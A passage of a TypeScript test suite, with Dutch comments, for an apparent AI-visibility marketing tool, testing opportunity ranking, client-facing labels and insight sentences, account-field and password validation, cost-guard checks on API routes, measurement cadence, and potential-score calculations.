    hasPlan: true,
  };

  const lijst = opportunities(basis);
  ok("de grootste kans staat bovenaan", lijst[0].title === "Groot");
  ok("de gewichten worden opgeteld", lijst[0].share === 0.30000000000000004 || Math.abs((lijst[0].share ?? 0) - 0.3) < 1e-9);

  // ⚠️ Conventie 3: geen doelvragen betekent geen getal, niet nul. Nul zou
  // zeggen dat er niets te winnen valt, en dat is iets anders dan "we weten het
  // niet".
  const onbekend = lijst.find((o) => o.title === "Onbekend")!;
  ok("zonder doelvragen geen getal", onbekend.raakt === null && onbekend.share === null);
  ok("en dus ook geen tekst op het scherm", reachLabel(onbekend.raakt, onbekend.gemeten) === null);
  ok("het aantal doelvragen wordt geteld", lijst[0].raakt === 2);

  // ⚠️ De belangrijkste regel van deze module: zolang een AI-assistent de site
  // niet kan lezen, levert élke geschreven pagina niets op. Een lijst die dat
  // als vierde item toont, laat iemand maanden schrijven voor de prullenbak.
  const geblokkeerd = opportunities({ ...basis, crawlerBlocked: true });
  ok("een geblokkeerde crawler staat altijd bovenaan", geblokkeerd[0].source === "techniek");
  ok(
    "ook al heeft hij geen getal",
    geblokkeerd[0].share === null && geblokkeerd[0].title.includes("niet lezen"),
  );

  // De goedkoopste kans die er is: het werk is al gedaan en betaald.
  const klaar = opportunities({ ...basis, readyToPublish: 3 });
  ok(
    "geschreven maar niet gepubliceerde pagina's staan boven de aanbevelingen",
    klaar.findIndex((o) => o.source === "plan") < klaar.findIndex((o) => o.source === "meting"),
  );
  ok("met het aantal erin", klaar.find((o) => o.source === "plan")!.title.includes("3"));

  ok(
    "een ongemeten onderwerp is ook een kans",
    lijst.some((o) => o.source === "onderwerp" && o.title.includes("Auto leasen")),
  );
  ok("elke kans heeft één handeling", lijst.every((o) => o.action.length > 0));

  // ── Het icoon per handeling (24 augustus 2026) ──────────────────────────
  //
  // ⚠️ Het icoon en de zin moeten hetzelfde beloven. Een blad met een pen erop
  // naast "Laat ORBIT ENGINE deze pagina schrijven" is erger dan geen icoon:
  // dan zegt de tekening dat er iets bestaat wat er niet is.
  ok(
    "een aanbeveling zonder bestaande pagina wordt een nieuwe pagina",
    lijst.every((o) => o.source !== "meting" || o.handeling === "nieuwe_pagina"),
  );
  const bijwerken = opportunities({
    ...basis,
    recommendations: [
      { title: "Bestaat al", why: "x", action: "verbeteren", existingUrl: "https://x.nl/a" },
    ],
  })[0];
  ok(
    "een aanbeveling mét bestaande pagina wordt bijwerken",
    bijwerken.handeling === "pagina_bijwerken" && bijwerken.action.startsWith("Werk "),
  );
  // ⚠️ "verbeteren" zonder URL is geen bijwerking: er is dan niets om heen te
  // gaan. Dan hoort er een nieuwe pagina te staan, met het icoon dat daarbij
  // hoort.
  const zonderUrl = opportunities({
    ...basis,
    recommendations: [{ title: "Geen url", why: "x", action: "verbeteren" }],
  })[0];
  ok(
    "verbeteren zonder URL blijft een nieuwe pagina",
    zonderUrl.handeling === "nieuwe_pagina" && !zonderUrl.action.startsWith("Werk "),
  );
  ok(
    "een geblokkeerde crawler is deblokkeren",
    geblokkeerd[0].handeling === "deblokkeren",
  );
  ok(
    "klaarstaande pagina's zijn publiceren",
    klaar.find((o) => o.source === "plan")!.handeling === "publiceren",
  );
  ok(
    "een ongemeten onderwerp is meten",
    lijst.find((o) => o.source === "onderwerp")!.handeling === "meten",
  );

  // Elke handeling moet een tekening hebben die ook echt bestaat. Zonder deze
  // test valt een nieuwe handeling stil terug op `undefined`, en dan crasht
  // het overzicht bij de klant en niet hier.
  ok(
    "elke kans wijst naar een icoon dat bestaat",
    [...lijst, ...geblokkeerd, ...klaar].every((o) => Boolean(ICONEN[OPPORTUNITY_ICON[o.handeling]])),
  );
});

group("workKindIcon: elke soort werk heeft één tekening die bestaat", () => {
  // De chip rechts zegt wat je gaat DOEN, het icoon links waar het OVER gaat.
  // Valt er één weg, dan rendert het overzicht een leeg gat op de plek waar de
  // klant kijkt.
  const soorten: WorkKind[] = ["blokkade", "goedkeuring", "herstel", "feit", "pagina", "offsite"];
  for (const soort of soorten) {
    ok(`${soort} heeft een icoon dat bestaat`, Boolean(ICONEN[workKindIcon(soort)]));
  }

  // ⚠️ Twee soorten mogen bewust dezelfde tekening delen (`blokkade` leent
  // `letop`), maar niet ongemerkt: zodra er een derde bijkomt die hem óók
  // deelt, zegt het icoon niets meer. Vijf verschillende op zes soorten is de
  // stand van vandaag.
  const tekeningen = new Set(soorten.map((s) => workKindIcon(s)));
  ok("hooguit één soort leent de tekening van een ander", tekeningen.size >= soorten.length - 1);

  // ⚠️ Dit stond tot 24 augustus 2026 achter `server-only` en was daardoor
  // nooit getest, terwijl het een zichtbaarheidsregel is: "bekijk wat er mis
  // is" mag er niet uitzien als "beantwoorden" (`docs/ux-design.md` §2).
  ok(
    "alleen een storing krijgt de rode chip",
    workChipTone("blokkade") === "danger" &&
      workChipTone("herstel") === "danger" &&
      workChipTone("goedkeuring") === "attention" &&
      workChipTone("feit") === "attention" &&
      workChipTone("pagina") === "attention" &&
      workChipTone("offsite") === "attention",
  );
});

group("reachLabel: een telling, geen percentage dat boven de 100 uitkomt", () => {
  // ⚠️ DE ECHTE FOUT VAN PRODUCTIE, 24 augustus 2026. Hier stond `shareLabel`,
  // en die rekende met de SOM van de bevroren gewichten. Een gewicht is
  // volumeband × koopwaarde per vraag, 0,02 tot 1,0
  // (`lib/pipeline/prompt-weight.ts`), dus vier koopklare vragen tellen op tot
  // 2,4. Op het overzicht van Van den Udenhout stond daardoor letterlijk "240%
  // van de gemeten vragen", naast een zichtbaarheid van 0%. Een percentage
  // boven de honderd is geen afrondingskwestie maar een cijfer dat niet kan
  // kloppen, en het is precies het soort getal dat een klant terugvraagt.
  ok("teller en noemer, allebei geteld", reachLabel(4, 30) === "raakt 4 van de 30 gemeten vragen");
  // ⚠️ Met een noemer erbij blijft het meervoud: het zelfstandig naamwoord hoort
  // bij de noemer. "1 van de 30 gemeten vraag" is geen Nederlands.
  ok("met noemer blijft het meervoud", reachLabel(1, 30) === "raakt 1 van de 30 gemeten vragen");
  ok("zonder noemer wél enkelvoud", reachLabel(1, null) === "raakt 1 gemeten vraag");
  ok("zonder noemer alleen de teller", reachLabel(4, null) === "raakt 4 gemeten vragen");
  ok("niets te tellen levert niets op", reachLabel(null, 30) === null);
  ok("nul doelvragen is ook niets", reachLabel(0, 30) === null);

  // Meer doelvragen dan gemeten vragen kan niet. Gebeurt het tóch (een rapport
  // van een oudere, bredere meting), dan is de noemer de onbetrouwbare helft en
  // valt hij weg. Nooit "raakt 8 van de 5".
  ok("een onmogelijke noemer valt weg", reachLabel(8, 5) === "raakt 8 gemeten vragen");
});

group("leesbaarWaarom: onze notatie hoort niet op het scherm van de klant", () => {
  // ⚠️ ALLE ZES DE AANBEVELINGEN HIERONDER KOMEN LETTERLIJK VAN PRODUCTIE
  // (Van den Udenhout, augustus 2026). Vijf van de zes begonnen met een zin
  // waarin onze vraagcodes en gewichten stonden, en die stond zo op het
  // overzichtsscherm van de klant. `docs/ux-design.md` §1: geen jargon.
  const echt = [
    "Dit is de belangrijkste gemiste groep vragen: V1 en V2 hebben gewicht 0,60. De bestaande financieringspagina is inhoudelijk het meest geschikt, maar moet duidelijk uitleggen wanneer financieren voordelig is.",
    "Er is volgens het site-aanbod geen eigen pagina voor leaseacties. Daardoor kan een assistent deze dienst moeilijk als zelfstandig aanbod herkennen. Combineer acties met een eenvoudige uitleg van kopen, financieren en private lease; dit ondersteunt vooral V2 en ook de keuzevragen V8 en V9.",
    "V3 en V4 behoren tot de zwaarste vragen, beide met gewicht 0,60. Een aparte, praktische uitleg maakt het merk zichtbaar op precies de vragen die een occasionkoper stelt.",
    "V5 is een belangrijke lokale koopvraag met gewicht 0,50. V12 is een aanvullende lokale vraag met gewicht 0,30. Maak per plaats duidelijk welke vestiging helpt en hoe iemand een afspraak maakt.",
    "V6 is een koopgerichte vraag met gewicht 0,50. Een eenvoudige rekentool met voorbeeldbedragen maakt de pagina bruikbaarder dan alleen algemene informatie.",
    "V7 heeft gewicht 0,50 en is sterk koopklaar. Beschrijf stap voor stap de aanvraag, de benodigde documenten en de vervolgstappen.",
  ];
  for (const tekst of echt) {
    const schoon = leesbaarWaarom(tekst) ?? "";
    ok(
      `geen vraagcode meer in "${tekst.slice(0, 28)}…"`,
      schoon.length > 0 && !/\bV\d/.test(schoon),
    );
    ok(`en geen gewicht meer in "${tekst.slice(0, 28)}…"`, !/gewicht/i.test(schoon));
  }

  // ⚠️ De staartclausule achter een puntkomma wordt geknipt in plaats van de
  // hele zin geschrapt: daar draagt de kop van de zin de enige bruikbare raad
  // die de aanbeveling geeft.
  const geknipt = leesbaarWaarom(echt[1]) ?? "";
  ok("de raad achter de puntkomma blijft staan", geknipt.includes("Combineer acties"));
  ok("en eindigt netjes op een punt", geknipt.endsWith("."));

  // Blijft er niets over, dan liever niets dan een half afgebroken zin
  // (conventie 3).
  ok("alles weg levert null op", leesbaarWaarom("V1 heeft gewicht 0,60.") === null);
  ok("leeg blijft leeg", leesbaarWaarom("") === null && leesbaarWaarom(null) === null);

  // Een gewone toelichting blijft ongemoeid, ook als er een V in een woord zit.
  const gewoon = "Maak per plaats duidelijk welke vestiging helpt. Volvo en Volkswagen horen erbij.";
  ok("gewone tekst blijft heel", leesbaarWaarom(gewoon) === gewoon);
});

group("opportunities: de potentiescore wint van share (fase 2, docs/tasks/potentiescore.md)", () => {
  const basis = {
    profileId: "p1",
    recommendations: [
      // "Groot gewicht" heeft het hoogste `share`, maar het laagste `potential`:
      // een hoog aandeel gemiste vragen van een onderwerp dat verder amper
      // gezocht wordt. "Klein gewicht" heeft het omgekeerde: minder gemiste
      // vragen, maar een onderwerp dat veel gezocht wordt.
      { title: "Groot gewicht, lage potentie", why: "x", targets: [{ weight: 0.4 }], potential: 15 },
      { title: "Klein gewicht, hoge potentie", why: "y", targets: [{ weight: 0.05 }], potential: 85 },
      { title: "Geen potentiescore", why: "z", targets: [{ weight: 0.2 }] },
    ],
    unmeasuredTopics: [],
    crawlerBlocked: false,
    readyToPublish: 0,
    hasPlan: true,
  };

  const lijst = opportunities(basis);
  ok(
    "de potentiescore bepaalt de volgorde, niet het aandeel",
    lijst[0].title === "Klein gewicht, hoge potentie",
  );
  ok("het potentiegetal staat op de kans", lijst[0].potential === 85);
  ok(
    "een kans MET potentiescore gaat voor een kans zonder, ook al is diens share hoger",
    lijst[1].title === "Groot gewicht, lage potentie",
  );
  ok("de kans zonder potentiescore staat als laatste", lijst[2].title === "Geen potentiescore");
  ok("en heeft wel nog gewoon een share als sorteersleutel", lijst[2].share === 0.2);

  // De noemer komt van de aanroeper (`loadLoop`), want hij vergt een query.
  const metNoemer = opportunities({
    ...basis,
    recommendations: [{ title: "Met noemer", why: "x", targets: [{ weight: 0.4 }], measured: 30 }],
  });
  ok(
    "de noemer komt mee op de kans",
    metNoemer[0].raakt === 1 && metNoemer[0].gemeten === 30,
  );

  // Zonder ENIGE potentiescore blijft de oude sortering op `share` intact.
  const zonderPotentie = opportunities({
    ...basis,
    recommendations: basis.recommendations.map(({ title, why, targets }) => ({ title, why, targets })),
  });
  ok(
    "zonder potentiescores sorteert alles gewoon op share, zoals vroeger",
    zonderPotentie[0].title === "Groot gewicht, lage potentie",
  );
});

group("insights: drie zinnen, en de ruis is de hoofdregel", () => {
  // ⚠️ DE ECHTE CIJFERS VAN FYSI-UNIQUE, van productie: 18 → 36 → 38 over drie
  // meetronden. Die sprong van 18 naar 36 ziet eruit als een verdubbeling en
  // valt tóch binnen de meetonzekerheid van ~23 punten bij 30 vragen. "Je
  // zichtbaarheid is verdubbeld" zou daar een leugen zijn met een grafiekje
  // eromheen.
  const ruis = insights({
    scores: [
      { period: 0, score: 18, stderr: 8 },
      { period: 1, score: 36, stderr: 8 },
    ],
    gepubliceerdDezeMaand: 0,
    klaarOmTePubliceren: 0,
    openKansen: 2,
    crawlerBlocked: false,
  });
  ok("altijd precies drie zinnen", ruis.length === 3);
  ok("een sprong binnen de ruis telt als gelijk gebleven", ruis[0].text.includes("gelijk gebleven"));
  ok("met de getallen er wél bij", ruis[0].text.includes("18") && ruis[0].text.includes("36"));
  ok("en de drempel erbij, anders is het een belofte", ruis[0].text.includes("meetonzekerheid"));
  ok("de toon is dan neutraal en niet groen", ruis[0].toon === "neutraal");

  // Een verschil dat de drempel wél haalt, mag gewoon een stijging heten.
  const echt = insights({
    scores: [
      { period: 0, score: 18, stderr: 2 },
      { period: 1, score: 45, stderr: 2 },
    ],
    gepubliceerdDezeMaand: 2,
    klaarOmTePubliceren: 0,
    openKansen: 0,
    crawlerBlocked: false,
  });
  ok("een echte stijging heet een stijging", echt[0].text.includes("echte stijging"));
  ok("en kleurt groen", echt[0].toon === "goed");

  // ⚠️ Een geblokkeerde crawler overstemt alles: de rest is dan theorie.
  const geblokkeerd = insights({
    scores: [{ period: 0, score: 20, stderr: 3 }],
    gepubliceerdDezeMaand: 5,
    klaarOmTePubliceren: 4,
    openKansen: 9,
    crawlerBlocked: true,
  });
  ok("een geblokkeerde crawler wint van alles", geblokkeerd[1].text.includes("niet lezen"));
  ok("en bepaalt de volgende stap", geblokkeerd[2].text.includes("robots.txt"));

  // Zonder enige meting geen conclusie.
  const leeg = insights({
    scores: [],
    gepubliceerdDezeMaand: 0,
    klaarOmTePubliceren: 0,
    openKansen: 0,
    crawlerBlocked: false,
  });
  ok("zonder meting nog steeds drie zinnen", leeg.length === 3);
  ok("maar geen conclusie", leeg[0].text.includes("nog geen meting"));

  // ⚠️ Bij de EERSTE meting staat het cijfer er bewust niet in. Deze zin staat
  // in de stand-kaart, direct onder het hoofdcijfer zelf; er stond "de eerste
  // meting staat op 0 van de 100" pal onder een kaart met 0%. Hetzelfde getal,
  // twee schalen (`docs/ux-design.md` §1: één hoofdgetal).
  const eerste = insights({
    scores: [{ period: 0, score: 42, stderr: 5 }],
    gepubliceerdDezeMaand: 0,
    klaarOmTePubliceren: 0,
    openKansen: 3,
    crawlerBlocked: false,
  });
  ok("de eerste meting noemt het cijfer niet nog een keer", !eerste[0].text.includes("42"));
  ok("maar zegt wel wat het is", eerste[0].text.includes("eerste meting"));

  // Bij twee metingen gaat de zin over het VERSCHIL, en dan zijn de cijfers
  // juist wél nieuwe informatie.
  ok("bij een vergelijking blijven de cijfers staan", ruis[0].text.includes("36"));

  // De goedkoopste stap krijgt voorrang boven de kansenlijst.
  const wachtOpPublicatie = insights({
    scores: [{ period: 0, score: 20, stderr: 3 }],
    gepubliceerdDezeMaand: 0,
    klaarOmTePubliceren: 2,
    openKansen: 9,
    crawlerBlocked: false,
  });
  ok(
    "publiceren gaat voor op nieuwe kansen",
    wachtOpPublicatie[2].text.includes("online"),
  );
});

group("de bewerkbare accountvelden (fase 7)", () => {
  // ⚠️ HETZELFDE VANGNET DAT BIJ HET MERKPROFIEL EEN ECHTE BUG VING.
  //
  // `proof_points` stond wél in de wizard maar niet in de bewerkbare velden van
  // de PATCH-route, en sloeg dus stilzwijgend niets op terwijl de melding
  // "opgeslagen" zei. Dit is dezelfde controle voor het account: elk veld dat
  // het scherm toont, moet opslaanbaar zijn.
  const opHetScherm = [
    "legal_name",
    "contact_person",
    "address",
    "postal_code",
    "city",
    "country",
    "invoice_email",
    "contact_phone",
    "vat_number",
    "vat_not_applicable",
  ];
  ok(
    "elk veld op het accountscherm is ook opslaanbaar",
    opHetScherm.every((v) => (EDITABLE_ACCOUNT_FIELDS as readonly string[]).includes(v)),
  );

  // ⚠️ En andersom: wat er NIET in mag, mag er ook niet in sluipen. Zou een
  // klant zijn eigen pakket kunnen zetten, dan is de verkoopafspraak een
  // suggestie; zou hij `cancelled_at` kunnen zetten, dan gaat opzeggen zonder
  // bevestiging.
  const verboden = [
    "package_pages_per_month",
    "started_at",
    "cancelled_at",
    "value_per_mention_eur",
    "name",
    "id",
  ];
  ok(
    "het pakket en de levenscyclus staan er niet in",
    verboden.every((v) => !(EDITABLE_ACCOUNT_FIELDS as readonly string[]).includes(v)),
  );
  ok(
    "geen dubbele velden",
    new Set(EDITABLE_ACCOUNT_FIELDS).size === EDITABLE_ACCOUNT_FIELDS.length,
  );
});

group("e-mail en wachtwoord wijzigen (fase 7)", () => {
  // ⚠️ De bevestigingsmail is wat een tikfout onschadelijk maakt: zonder die
  // stap werkt het oude adres niet meer en bestaat het nieuwe niet, en dan zit
  // iemand permanent buiten zijn eigen account.
  const goed = checkNewEmail("  Nieuw@Bedrijf.NL ", "oud@bedrijf.nl");
  ok("een geldig adres gaat door", goed.ok === true);
  ok(
    "en wordt getrimd en kleingeschreven",
    goed.ok === true && goed.email === "nieuw@bedrijf.nl",
  );
  ok("leeg wordt geweigerd", checkNewEmail("  ", "oud@bedrijf.nl").ok === false);
  ok("iets zonder apenstaartje ook", checkNewEmail("geenadres", "oud@bedrijf.nl").ok === false);
  // Hetzelfde adres opnieuw insturen zou een bevestigingsmail opleveren voor een
  // wijziging die er niet is, en dat leest als een inbraakpoging.
  ok(
    "het huidige adres opnieuw insturen wordt geweigerd",
    checkNewEmail("OUD@bedrijf.nl", "oud@bedrijf.nl").ok === false,
  );

  // ── Het wachtwoord ────────────────────────────────────────────────────────
  ok("een sterk wachtwoord gaat door", checkNewPassword("Wachtwoord1", "Oud12345").ok === true);
  ok("leeg wordt geweigerd", checkNewPassword("", "Oud12345").ok === false);

  const zwak = checkNewPassword("kort", "Oud12345");
  ok("te zwak wordt geweigerd", zwak.ok === false);
  // ⚠️ Alleen de ONTBREKENDE regels noemen. Wie er twee goed heeft, hoeft niet
  // te lezen wat hij al deed.
  ok(
    "en de melding noemt alleen wat nog mist",
    zwak.ok === false &&
      zwak.message.includes("cijfer") &&
      zwak.message.includes("hoofdletter") &&
      zwak.message.includes("8 tekens"),
  );
  const bijnaGoed = checkNewPassword("wachtwoord1", "Oud12345");
  ok(
    "bij één ontbrekende regel staat alleen die erin",
    bijnaGoed.ok === false &&
      bijnaGoed.message.includes("hoofdletter") &&
      !bijnaGoed.message.includes("cijfer"),
  );

  ok(
    "hetzelfde wachtwoord opnieuw wordt geweigerd",
    checkNewPassword("Wachtwoord1", "Wachtwoord1").ok === false,
  );

  // Dezelfde drie regels als bij de uitnodiging: twee verschillende sterktes
  // voor hetzelfde wachtwoord is een verschil dat niemand kan uitleggen.
  ok(
    "de regels zijn dezelfde als bij de uitnodiging",
    passwordRules("Wachtwoord1").every((r) => r.ok) &&
      checkNewPassword("Wachtwoord1", "iets anders").ok === true,
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe kostenrem (besluit 18)");

group("elke dure route vraagt het aan dezelfde functie", () => {
  // ⚠️ DIT IS EEN BRONCODECONTROLE EN GEEN GEDRAGSTEST, en dat is met opzet.
  //
  // De fout die dit voorkomt is niet "de controle werkt niet" maar "er komt een
  // route bij en iemand vergeet de controle". Dat is precies hoe
  // `getOwnedAnalysis` de accountlaag miste: een laag toegevoegd, één aanroeper
  // vergeten. Een gedragstest per route zou elke nieuwe route mét test hebben en
  // de route zónder test niet zien.
  const duur = [
    "app/api/profiles/route.ts",
    "app/api/profiles/[id]/research/route.ts",
    "app/api/profiles/[id]/deep-research/route.ts",
    "app/api/profiles/[id]/topics/route.ts",
    "app/api/profiles/[id]/plan/route.ts",
    "app/api/profiles/[id]/plan/months/[monthId]/route.ts",
    "app/api/analyses/[id]/confirm/route.ts",
    "app/api/analyses/[id]/measure/route.ts",
    "app/api/analyses/[id]/generate/route.ts",
    "app/api/analyses/[id]/generate-all/route.ts",
    "app/api/analyses/[id]/briefing/route.ts",
    // De reputatieanalyse (22 augustus 2026). Een zesde dure route, en hij
    // stelt precies dezelfde twee vragen aan precies dezelfde functies. Twee
    // functies die hetzelfde zouden moeten doen drijven uit elkaar (P2), en dat
    // is met `getOwnedProfile` en `getOwnedAnalysis` letterlijk gebeurd.
    "app/api/profiles/[id]/reputation/route.ts",
  ];

  for (const pad of duur) {
    const bron = readFileSync(pad, "utf8");
    ok(
      `${pad.replace("app/api/", "")} vraagt mayTriggerCost`,
      bron.includes("mayTriggerCost("),
    );
    // ⚠️ En de TWEEDE rem, om dezelfde reden (F1). Besluit 18 zegt WIE er mag
    // uitgeven, het budgetplafond zegt HOEVEEL er nog over is. Een route die
    // alleen de eerste stelt, laat een beheerder met een vastgelopen lus
    // ongehinderd doorgaan.
    ok(
      `${pad.replace("app/api/", "")} vraagt ook het budget`,
      bron.includes("checkBudget"),
    );
  }

  // En de melding is per handeling anders (K2, zie docs/logbook.md: elke
  // foutmelding is specifiek). Zes handelingen sinds 22 augustus 2026, zes
  // zinnen, geen dubbele.
  const zinnen = Object.values(COST_DENIED);
  ok("zes handelingen hebben elk een eigen melding", zinnen.length === 6, `${zinnen.length}`);
  ok("en geen twee zijn hetzelfde", new Set(zinnen).size === zinnen.length);
  ok(
    "geen enkele melding zegt alleen 'geen toegang'",
    zinnen.every((z) => z.length > 40 && !/geen toegang/i.test(z)),
  );
  // ⚠️ De reputatiemelding is de enige die een LOS PRODUCT aankondigt, en de
  // toon moet dus uitnodigen in plaats van afwijzen. De klant mag het zien, hij
  // weet nu dat het bestaat, en hij weet bij wie hij moet zijn. Een grijze knop
  // of een verborgen menu-item zou precies het tegenovergestelde doen: dan weet
  // hij niet dat dit product er is, en dan verkoop je het nooit.
  ok(
    "en de reputatiemelding zegt bij wie de klant moet zijn",
    /consultant/i.test(COST_DENIED.reputatie_starten),
    COST_DENIED.reputatie_starten,
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe meetcadans");

group("mayMeasureAgain: niet opnieuw meten wat net gemeten is", () => {
  const nu = new Date("2026-09-01T06:00:00Z");

  // ⚠️ HET GEVAL DAT DIT AFVANGT. Een klant die op 28 augustus is aangesloten en
  // gemeten, zou op 1 september alweer een volle betaalde ronde krijgen. Vier
  // dagen later, met een punt op de trendlijn dat een maand suggereert.
  const vers = mayMeasureAgain("2026-08-28T06:00:00Z", nu);
  ok("vier dagen geleden is te vers", !vers.ok);
  ok("en de melding noemt het aantal dagen", !vers.ok && vers.reason.includes("4 dagen"));
  ok("en de grens", !vers.ok && vers.reason.includes("21"));

  // Het bewijs uit de database: Fysi-Unique had drie periodes in twee dagen.
  ok("dezelfde dag mag zeker niet", !mayMeasureAgain("2026-09-01T05:00:00Z", nu).ok);
  ok("één dag ook niet", !mayMeasureAgain("2026-08-31T06:00:00Z", nu).ok);

  // Een normale maand mag gewoon.
  ok("een maand geleden mag", mayMeasureAgain("2026-08-01T06:00:00Z", nu).ok);
  ok("precies 21 dagen mag ook", mayMeasureAgain("2026-08-11T06:00:00Z", nu).ok);
  ok("20 dagen net niet", !mayMeasureAgain("2026-08-12T06:00:00Z", nu).ok);

  // Nooit eerder gemeten: er is niets om te vroeg aan te zijn.
  ok("zonder vorige meting mag het altijd", mayMeasureAgain(null, nu).ok);
  ok("en undefined ook", mayMeasureAgain(undefined, nu).ok);

  // ⚠️ Een onleesbare datum blokkeert niet. Deze controle hoort te falen
  // richting "gewoon meten": het alternatief is dat de hele maandronde stilvalt
  // op één rare waarde, en dat is erger dan één ronde te veel.
  ok("een onleesbare datum blokkeert niet", mayMeasureAgain("geen datum", nu).ok);

  ok("de grens staat op 21 dagen", MIN_DAGEN_TUSSEN_PERIODES === 21);
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nDe potentiescore (docs/tasks/potentiescore.md)");

group("visibilityIndex: het aandeel dat genoemd wordt", () => {
  ok("de helft genoemd is 50", visibilityIndex(5, 10) === 50);
  ok("alles genoemd is 100", visibilityIndex(10, 10) === 100);
  ok("niets genoemd is 0", visibilityIndex(0, 10) === 0);
  ok("geen vragen is onbekend, niet 0", visibilityIndex(0, 0) === null);
  ok("negatief aantal wordt niet negatief", visibilityIndex(-3, 10) === 0);
});

group("potentialScore: een product, geen gemiddelde", () => {
  // ⚠️ Het kernvoorbeeld uit de vraag: niet zichtbaar én hoog zoekvolume is de
  // grootste kans, niet zichtbaar op een nichonderwerp een kleinere.
  const groot = potentialScore(0, 90);
  const klein = potentialScore(0, 10);
  ok("hoog zoekvolume geeft hoge potentie", groot !== null && groot >= 85);
  ok("laag zoekvolume geeft lage potentie, zelfde zichtbaarheidsgat", klein !== null && klein <= 15);
  ok("groot > klein", (groot ?? 0) > (klein ?? 0));

  // Volledig zichtbaar: niets meer te winnen, ongeacht het zoekvolume.
  ok("zichtbaarheid 100 geeft potentie 0", potentialScore(100, 100) === 0);
  ok("ook bij het maximale zoekvolume", potentialScore(100, 90) === 0);

  // Eén van de twee helften onbekend: geen gegokt getal.
  ok("onbekende zichtbaarheid geeft null", potentialScore(null, 80) === null);
  ok("onbekend zoekvolume geeft null", potentialScore(40, null) === null);
  ok("allebei onbekend geeft null", potentialScore(null, null) === null);

  // Middenwaarde, met de hand nagerekend: gat 60% × volume 50 = 30.
  ok("een middenwaarde klopt met de hand", potentialScore(40, 50) === 30);
});

group("potentialBand: de grenzen", () => {
  ok("null is onbekend", potentialBand(null) === "onbekend");
  ok("0 is beperkt", potentialBand(0) === "beperkt");
  ok("24 is nog beperkt", potentialBand(24) === "beperkt");
  ok("25 is gemiddeld", potentialBand(25) === "gemiddeld");
  ok("54 is nog gemiddeld", potentialBand(54) === "gemiddeld");
  ok("55 is hoog", potentialBand(55) === "hoog");
  ok("100 is hoog", potentialBand(100) === "hoog");
});

group("potentialExplanation: nooit een gegokte zin", () => {
  ok(
    "beide onbekend zegt dat het allebei onbekend is",
    potentialExplanation(null, null).includes("zichtbaarheid") &&
      potentialExplanation(null, null).includes("zoekvolume"),
  );
  ok("alleen zichtbaarheid onbekend noemt dat", potentialExplanation(null, 80).includes("zichtbaarheid"));
  ok("alleen zoekvolume onbekend noemt dat", potentialExplanation(40, null).includes("zoekvolume"));
  ok(
    "met beide bekend staat het gemiste percentage erin",
    potentialExplanation(40, 80).includes("60%"),
  );
});

// doorloop-huyberts.md punt 4: de zeven kansen van Huyberts Keukens (echte
// productie-cijfers, 26 augustus 2026) kwamen allemaal op potentie 58 uit,
// want ze delen hetzelfde onderwerp (dus hetzelfde zoekvolume) en dezelfde
// zichtbaarheid (nul, een gloednieuwe klant). distributePotentialByWeight()
// moet ze alsnog onderscheiden, met de zwaarste kans als anker op 58.
group("distributePotentialByWeight: Huyberts Keukens, echte cijfers", () => {
  const analysisId = "huyberts-renovatie";
  const kansen = [
    { id: "renovatiepagina", analysisId, potential: 58, targetWeight: 3.0 },
    { id: "eindhoven", analysisId, potential: 58, targetWeight: 1.7 },
    { id: "den-bosch-helmond-veghel", analysisId, potential: 58, targetWeight: 1.5 },
    { id: "deurtjes-fronten-grepen", analysisId, potential: 58, targetWeight: 1.3 },
    { id: "keukenmontage", analysisId, potential: 58, targetWeight: 1.3 },
    { id: "apparatuur-kookplaten", analysisId, potential: 58, targetWeight: 1.1 },
    { id: "kosten", analysisId, potential: 58, targetWeight: 0.3 },
  ];
  const uitkomst = distributePotentialByWeight(kansen);

  eq2("de zwaarste kans is het anker en houdt zijn score", uitkomst.get("renovatiepagina"), 58);
  eq2("een kans met iets meer dan de helft van het gewicht", uitkomst.get("eindhoven"), 33);
  eq2("exact de helft van het gewicht", uitkomst.get("den-bosch-helmond-veghel"), 29);
  eq2("gelijk gewicht geeft gelijke score, en dat is eerlijk", uitkomst.get("deurtjes-fronten-grepen"), 25);
  eq2("dezelfde score als zijn gewichtsgenoot", uitkomst.get("keukenmontage"), 25);
  eq2("een derde van het gewicht", uitkomst.get("apparatuur-kookplaten"), 21);
  eq2("de lichtste kans krijgt de laagste score, niet nul", uitkomst.get("kosten"), 6);

  const scores = kansen.map((k) => uitkomst.get(k.id));
  ok(
    "zes van de zeven scores zijn nu onderling verschillend (twee wegen precies even zwaar)",
    new Set(scores).size === 6,
    `${new Set(scores).size} unieke scores: ${scores.join(", ")}`,
  );
});

group("distributePotentialByWeight: raakt niets dat al onderscheidt", () => {
  // Gasservice Brabant: vijf kansen delen score 77 (herverdelen), drie
  // andere kansen hebben elk hun EIGEN score (echt gemeten verschil in
  // zichtbaarheid) en horen dus onaangeraakt te blijven.
  const analysisId = "gasservice-cv-ketel";
  const uitkomst = distributePotentialByWeight([
    { id: "prijzen-repareren-vervangen", analysisId, potential: 77, targetWeight: 1.2 },
    { id: "geen-warm-water", analysisId, potential: 77, targetWeight: 0.8 },
    { id: "bereikbaarheid", analysisId, potential: 77, targetWeight: 0.6 },
    { id: "storingen-eindhoven", analysisId, potential: 77, targetWeight: 0.5 },
    { id: "remeha-limburg", analysisId, potential: 77, targetWeight: 0.5 },
    { id: "spoedhulp-den-bosch", analysisId, potential: 39, targetWeight: 0.8 },
    { id: "onderhoud-oudere-ketels", analysisId, potential: 34, targetWeight: 0.32 },
    { id: "storing-inspectie-vught", analysisId, potential: 0, targetWeight: 0.5 },
  ]);

  eq2("de groep van vijf krijgt zijn anker terug", uitkomst.get("prijzen-repareren-vervangen"), 77);
  eq2("en wordt daarbinnen onderscheiden", uitkomst.get("geen-warm-water"), 51);
  ok(
    "twee kansen met gelijk gewicht in de groep van vijf krijgen gelijke score",
    uitkomst.get("storingen-eindhoven") === uitkomst.get("remeha-limburg"),
  );

  // De drie singletons (geen enkele andere kans deelt hun score) blijven
  // exact zoals ze waren: dit vangnet mag nooit een al gemeten verschil
  // overschrijven.
  eq2("een kans met een unieke score blijft onaangeraakt (39)", uitkomst.get("spoedhulp-den-bosch"), 39);
  eq2("een kans met een unieke score blijft onaangeraakt (34)", uitkomst.get("onderhoud-oudere-ketels"), 34);
  eq2("potentie 0 blijft 0", uitkomst.get("storing-inspectie-vught"), 0);
});

group("distributePotentialByWeight: randgevallen", () => {
  const analysisId = "randgeval";
  ok(
    "geen enkel gewicht bekend in de groep: niemand wordt aangeraakt",
    (() => {
